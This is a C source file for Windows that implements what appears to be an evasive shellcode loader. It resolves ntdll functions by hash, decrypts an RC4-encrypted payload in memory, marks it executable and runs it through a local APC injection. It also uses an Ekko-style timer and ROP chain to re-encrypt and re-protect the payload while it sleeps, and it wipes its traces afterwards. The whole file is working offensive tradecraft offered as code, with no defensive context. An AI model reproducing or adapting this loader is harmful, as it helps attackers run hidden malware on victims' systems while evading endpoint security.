#include <Windows.h>
#include "Header.h"
#include "Structs.h"


#define FLAGS (WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD)
#define KEYSIZE   16
#define SLEEPTIME 15000 //100 // 


typedef struct {
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
}ENC_DATA;

typedef struct _MakeTime {

    
    CONTEXT             CtxThread;
    CONTEXT             RopProtRO;
    CONTEXT             RopProtRW;
    CONTEXT             RopMemEnc;
    CONTEXT             RopMemDec;
    CONTEXT             RopProtRX;
    CONTEXT             RopSetEvt;

    ENC_DATA KeyData;
    ENC_DATA StubData;

    CHAR KeyBuf[KEYSIZE] ;
    BOOL Initialized;

    PVOID NtContinue;
    PVOID RtlRegisterWait;
    PVOID SystemFunction032;
    PVOID NtSetEvent;

}MakeTime, * PMakeTime;

MakeTime CutTime = { 0 };




CALLBACK pNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection) {

    ULONG   lpOldProtection         = NULL;
    PVOID   pBaseAddress            = &BaseAddress;
    SIZE_T  pNumberOfBytesToProtect = &NumberOfBytesToProtect;



    fnNtProtectVirtualMemory NtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddressF(NTDLLDLL_Rotr32, NtProtectVirtualMemory_Rotr32);
    if (!NT_SUCCESS((NtProtectVirtualMemory(ProcessHandle, pBaseAddress, pNumberOfBytesToProtect, NewAccessProtection, &lpOldProtection)))) {
        return NULL;
    }


}


unsigned short lfsr = 0xACE1u;
unsigned bit;

unsigned rand2()
{
    bit = ((lfsr >> 0) ^ (lfsr >> 2) ^ (lfsr >> 3) ^ (lfsr >> 5)) & 1;
    return lfsr = (lfsr >> 1) | (bit << 15);
}

VOID NtCreateTimer(PVOID pAddress, DWORD Size, DWORD SleepTime) {

    if (CutTime.Initialized != TRUE) {
        INT         RndCounter          = 0;
        HMODULE     hModule             = NULL;

        for (int i = 0; i < KEYSIZE; i++) {
            CutTime.KeyBuf[i] = rand2() % 256;
            RndCounter++;
        }
       

        CutTime.KeyData.Buffer = CutTime.KeyBuf;
        CutTime.KeyData.Length = CutTime.KeyData.MaximumLength = KEYSIZE;

        CutTime.StubData.Buffer = pAddress;
        CutTime.StubData.Length = CutTime.StubData.MaximumLength = Size;


        CutTime.NtContinue = GetProcAddressF(NTDLLDLL_Rotr32, NtContinue_Rotr32);
        CutTime.RtlRegisterWait = GetProcAddressF(NTDLLDLL_Rotr32, RtlRegisterWait_Rotr32);
        CutTime.SystemFunction032 = GetProcAddressF(CRYPTSPDLL_Rotr32, SystemFunction032_Rotr32);
        CutTime.NtSetEvent = GetProcAddressF(NTDLLDLL_Rotr32, NtSetEvent_Rotr32);


        if (CutTime.NtContinue == NULL || CutTime.RtlRegisterWait == NULL || CutTime.SystemFunction032 == NULL || CutTime.NtSetEvent == NULL) {
            return;
        }
        CutTime.Initialized = TRUE;
    }


    HANDLE              hEvent          = NULL;
    HANDLE              hNewWaitObject  = NULL;
    DWORD               Milliseconds    = 0;
    fnRtlRegisterWait   RtlRegisterWait = (fnRtlRegisterWait)CutTime.RtlRegisterWait;
    
  
    fnNtCreateEvent NtCreateEvent = (fnNtCreateEvent)GetProcAddressF(NTDLLDLL_Rotr32, NtCreateEvent_Rotr32);
    if (!NT_SUCCESS(NtCreateEvent(&hEvent, GENERIC_ALL, NULL, NotificationEvent, FALSE))) {
        return;
    }


    if (NT_SUCCESS(RtlRegisterWait(&hNewWaitObject, hEvent, RtlCaptureContext, &CutTime.CtxThread, 0, FLAGS))) {

        SucrificeThread(50, SLEEPTODO);

        CP2(&CutTime.RopProtRO, &CutTime.CtxThread, sizeof(CONTEXT));
        CP2(&CutTime.RopMemEnc, &CutTime.CtxThread, sizeof(CONTEXT));
        CP2(&CutTime.RopProtRW, &CutTime.CtxThread, sizeof(CONTEXT));
        CP2(&CutTime.RopMemDec, &CutTime.CtxThread, sizeof(CONTEXT));
        CP2(&CutTime.RopProtRX, &CutTime.CtxThread, sizeof(CONTEXT));
        CP2(&CutTime.RopSetEvt, &CutTime.CtxThread, sizeof(CONTEXT));


        CutTime.RopMemEnc.Rsp -= 8;
        CutTime.RopMemEnc.Rip = CutTime.SystemFunction032;
        CutTime.RopMemEnc.Rcx = &CutTime.StubData;
        CutTime.RopMemEnc.Rdx = &CutTime.KeyData;

        CutTime.RopProtRO.Rsp -= 8;
        CutTime.RopProtRO.Rip = &pNtProtectVirtualMemory;
        CutTime.RopProtRO.Rcx = NtCurrentProcess();
        CutTime.RopProtRO.Rdx = pAddress;
        CutTime.RopProtRO.R8  = Size;
        CutTime.RopProtRO.R9 = PAGE_READONLY;

        CutTime.RopProtRW.Rsp -= 8;
        CutTime.RopProtRW.Rip = &pNtProtectVirtualMemory;
        CutTime.RopProtRW.Rcx = NtCurrentProcess();
        CutTime.RopProtRW.Rdx = pAddress;
        CutTime.RopProtRW.R8 = Size;
        CutTime.RopProtRW.R9 = PAGE_READWRITE;
      
        CutTime.RopMemDec.Rsp -= 8;
        CutTime.RopMemDec.Rip = CutTime.SystemFunction032;
        CutTime.RopMemDec.Rcx = &CutTime.StubData;
        CutTime.RopMemDec.Rdx = &CutTime.KeyData;

        CutTime.RopProtRX.Rsp -= 8;
        CutTime.RopProtRX.Rip = &pNtProtectVirtualMemory;
        CutTime.RopProtRX.Rcx = NtCurrentProcess();
        CutTime.RopProtRX.Rdx = pAddress;
        CutTime.RopProtRX.R8  = Size;
        CutTime.RopProtRX.R9  = PAGE_EXECUTE_READWRITE;

        CutTime.RopSetEvt.Rsp -= 8;
        CutTime.RopSetEvt.Rip = CutTime.NtSetEvent;
        CutTime.RopSetEvt.Rcx = hEvent;
        CutTime.RopSetEvt.Rdx = NULL;


        RtlRegisterWait(&hNewWaitObject, hEvent, CutTime.NtContinue, &CutTime.RopMemEnc, (Milliseconds += 100), FLAGS);
        RtlRegisterWait(&hNewWaitObject, hEvent, CutTime.NtContinue, &CutTime.RopProtRO, (Milliseconds += 100), FLAGS);
        SucrificeThread(SleepTime, SLEEPTODO);
        RtlRegisterWait(&hNewWaitObject, hEvent, CutTime.NtContinue, &CutTime.RopProtRW, (Milliseconds += 100), FLAGS);
        RtlRegisterWait(&hNewWaitObject, hEvent, CutTime.NtContinue, &CutTime.RopMemDec, (Milliseconds += 100), FLAGS);
        RtlRegisterWait(&hNewWaitObject, hEvent, CutTime.NtContinue, &CutTime.RopProtRX, (Milliseconds += 100), FLAGS);
        RtlRegisterWait(&hNewWaitObject, hEvent, CutTime.NtContinue, &CutTime.RopSetEvt, (Milliseconds += 100), FLAGS);


        
        fnNtWaitForSingleObject NtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddressF(NTDLLDLL_Rotr32, NtWaitForSingleObject_Rotr32);
        if (!NT_SUCCESS((NtWaitForSingleObject(hEvent, FALSE, NULL)))) {
            return;
        }

    }
}


typedef struct {
    PVOID  payload;
    SIZE_T Size;
}Clean;

Clean CleanupStruct1 = { 0 };
Clean CleanupStruct2 = { 0 };


VOID CleanUp1() {
    SucrificeThread(2000, SLEEPTODO);
    ZM2(CleanupStruct1.payload, CleanupStruct1.Size);
    HeapFree(GetProcessHeap(), 0, CleanupStruct1.payload);
}



VOID CleanUp2() {
    
    SucrificeThread(3000 + SLEEPTIME, SLEEPTODO);
    ZM2(CleanupStruct2.payload, CleanupStruct2.Size);



    fnNtFreeVirtualMemory NtFreeVirtualMemory = (fnNtFreeVirtualMemory)GetProcAddressF(NTDLLDLL_Rotr32, NtFreeVirtualMemory_Rotr32);
    if (!NT_SUCCESS(NtFreeVirtualMemory(NtCurrentProcess(), &CleanupStruct2.payload, &CleanupStruct2.Size, MEM_DECOMMIT))) {
        return;
    }

}


PVOID NtAllocateAndSet(unsigned char* key, PBYTE Payload, SIZE_T SizeOfPayload) {

    PVOID			pAddress = NULL;
    HANDLE			hProcess = NtCurrentProcess();
    SIZE_T			SizeOfPayload2 = SizeOfPayload;
    ULONG			OldProtection = NULL;



    fnNtAllocateVirtualMemory NtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddressF(NTDLLDLL_Rotr32, NtAllocateVirtualMemory_Rotr32);
    if (!NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &pAddress, 0, &SizeOfPayload2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        return NULL;
    }

    if (pAddress != NULL)
        CP2(pAddress, Payload, SizeOfPayload);

    SucrificeThread(SLEEPTIME, SLEEPTODO);
    DecryptMemPayload(key, Payload, pAddress, SizeOfPayload);
    SucrificeThread(SLEEPTIME, SLEEPTODO);


    fnNtProtectVirtualMemory NtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddressF(NTDLLDLL_Rotr32, NtProtectVirtualMemory_Rotr32);
    if (!NT_SUCCESS((NtProtectVirtualMemory(hProcess, &pAddress, &SizeOfPayload2, PAGE_EXECUTE_READWRITE, &OldProtection)))) {
        return NULL;
    }

    return pAddress;
}


HANDLE LocalApcHijack(PVOID pPayload) {

    HANDLE hThread = NULL;
    HANDLE hProcess = NtCurrentProcess();
  

    fnNtCreateThreadEx NtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressF(NTDLLDLL_Rotr32, NtCreateThreadEx_Rotr32);
    if (!NT_SUCCESS((NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)SucrificeThread, NULL, FALSE, NULL, NULL, NULL, NULL)))) {
        return NULL;
    }


    fnNtQueueApcThread NtQueueApcThread = (fnNtQueueApcThread)GetProcAddressF(NTDLLDLL_Rotr32, NtQueueApcThread_Rotr32);
    if (!NT_SUCCESS((NtQueueApcThread(hThread, pPayload, NULL, NULL, NULL)))) {
        return NULL;
    }
    return hThread;
}




VOID SucrificeThread(DWORD plMilliSeconds, INT TODO) {
    
    HANDLE  hEvent;

    fnNtCreateEvent NtCreateEvent = (fnNtCreateEvent)GetProcAddressF(NTDLLDLL_Rotr32, NtCreateEvent_Rotr32);
    if (!NT_SUCCESS(NtCreateEvent(&hEvent, GENERIC_ALL, NULL, NotificationEvent, FALSE))) {
        return;
    }

    if (TODO == SLEEPTODO) {
        MsgWaitForMultipleObjectsEx(
            0x01,
            &hEvent,
            plMilliSeconds,
            QS_TIMER,
            0x00
        );
    }
    else {
        MsgWaitForMultipleObjectsEx(
            0x01,
            &hEvent,
            INFINITE,
            QS_ALLINPUT,
            MWMO_WAITALL | MWMO_ALERTABLE
        );
    }
}




BOOL DecPayload(unsigned char* Rc4Key, unsigned char* pEncPayload, SIZE_T sPayloadSize);


VOID DecryptMemPayload(unsigned char* key, PVOID pClean, PVOID pRun, SIZE_T Size) {
    if(!DecPayload(key, pRun, Size)){
        return;
    }

    CleanupStruct1.payload = pClean;
    CleanupStruct2.payload = pRun;
    CleanupStruct1.Size = CleanupStruct2.Size = Size;
    
    CreateThread(NULL, 0, CleanUp1, NULL, NULL, NULL);
   // CreateThread(NULL, 0, CleanUp2, NULL, NULL, NULL);
}



typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


BOOL DecPayload (unsigned char* Rc4Key, unsigned char* pEncPayload, SIZE_T sPayloadSize) {
    NTSTATUS STATUS = 0x0;

    USTRING Key = { 0 };
    USTRING Img = { 0 };

    Key.Buffer = Rc4Key;
    Key.Length = Key.MaximumLength = KEYSIZE;

    Img.Buffer = pEncPayload;
    Img.Length = Img.MaximumLength = sPayloadSize;


    
    if ((LdrLoadDll("Cryptsp.dll")) == NULL) {
        return FALSE;
    }


    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressF(CRYPTSPDLL_Rotr32, SystemFunction032_Rotr32);
    if (SystemFunction032 == NULL) {
        return FALSE;
    }

    if (!NT_SUCCESS(STATUS = SystemFunction032(&Img, &Key))) {
        return FALSE;
    }

    return TRUE;
}

